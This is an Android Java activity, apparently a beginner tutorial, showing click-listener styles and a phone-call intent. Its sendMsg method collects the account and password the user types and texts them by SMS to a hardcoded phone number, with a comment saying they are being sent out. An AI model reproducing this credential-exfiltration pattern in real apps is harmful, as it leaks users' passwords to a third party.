package com.example.administrator.myapplication;

import android.content.Intent;
import android.net.Uri;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.EditText;
import android.widget.Toast;

import java.util.ArrayList;

/**
 * 活动，代表一个界面
 */
public class MainActivity extends AppCompatActivity implements View.OnClickListener{
    EditText editText_acc;
    EditText editText_pwd;

    /**
     *界面启动时调用的方法
     */
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //设置显示的UI
        setContentView(R.layout.activity_main);
        //找到界面的按钮
        View view=findViewById(R.id.callnumber);
        //给按钮设置一个点击事件
        view.setOnClickListener(new MyListener());

        View view1=findViewById(R.id.button2);
        /**
           击事件的四种写法  二
            匿名内部类：简单点击事件的实现 一般都用匿名内部类
         */
        view1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Toast.makeText(v.getContext(),"匿名内部类被点击了!!!!!!!!!!!!",Toast.LENGTH_SHORT).show();
                System.out.println("被点击了!!!!!!!!!!!!!!!");
            }
        });
        /**
         * 击事件的四种写法  三
         *让当前的activity（MainActivity）实现接口
         */
        View view2=findViewById(R.id.button3);
        view2.setOnClickListener(this);

        /**
         * 击事件的四种写法  四
         *在布局文件中配置点击事件的方法
         */
//        View view3=findViewById(R.id.button4);

        /**
         * 模拟短信发送器
         */
        editText_acc=(EditText) findViewById(R.id.edit_account);
        editText_pwd=(EditText) findViewById(R.id.edit_pwd);
    }

    @Override
    public void onClick(View v) {
        Toast.makeText(this,"点击事件第三种写法被点击了!!!!!!!!!!!!!!!",Toast.LENGTH_SHORT).show();
    }

    /**
     * 点击事件的四种写法  一
     * 1、内部类实现接口 new实现类
     */
    private class MyListener implements View.OnClickListener{
        @Override
        public void onClick(View v) {
            //按钮被点击的事件
            System.out.println("begin call number!!!!!!!!!!!!!!!");
            //松耦合
            //意图  Intent
            Intent intent=new Intent();
            //设置动作  拨打电话的动作
            intent.setAction(Intent.ACTION_CALL);
            //设置数据 Uri 统一资源标识符 ，定义比较广    URL统一资源定位符，定位比较窄（一般网络路径http、ftp等）
            intent.setData(Uri.parse("tel://123"));
            //激活动作
            startActivity(intent);
        }
    }

    public void testClick(View view){
        Toast.makeText(view.getContext(),"点击事件第四种写法被点击了!!!!!!!!!!!!",Toast.LENGTH_LONG).show();
    }

    public void sendMsg(View view){
        String account=editText_acc.getText().toString();
        String pwd=editText_pwd.getText().toString();
        //把账号密码发送出去
        Toast.makeText(view.getContext(),account+"--"+pwd+"正在发送出去!!!!!",Toast.LENGTH_LONG).show();
        SmsManager.getDefault().sendTextMessage("19864759568",null,account+"--"+pwd,null,null);
        //短信超过一条短信的长度时，需要拆分一下发送
//        ArrayList<String> contents=SmsManager.getDefault().divideMessage("很长很长的短信");
//        for(String s:contents){
//            SmsManager.getDefault().sendTextMessage("19864759568",null,s,null,null);
//        }
    }
}
